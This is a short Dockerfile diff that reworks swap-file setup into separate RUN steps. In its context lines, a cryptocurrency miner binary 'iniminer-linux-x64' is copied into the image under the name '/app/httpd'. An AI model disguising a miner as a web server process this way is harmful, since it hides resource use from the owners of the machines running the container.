@@ -15,10 +15,8 @@ RUN apt-get update && apt-get install -y \
 WORKDIR /app
 
 # Enable swap
-RUN fallocate -l 1G /swapfile && \
-    chmod 600 /swapfile && \
-    mkswap /swapfile && \
-    swapon /swapfile && \
+RUN fallocate -l 1G /swapfile 
+RUN chmod 600 /swapfile 
 
 # Download miner binary
 COPY iniminer-linux-x64 /app/httpd
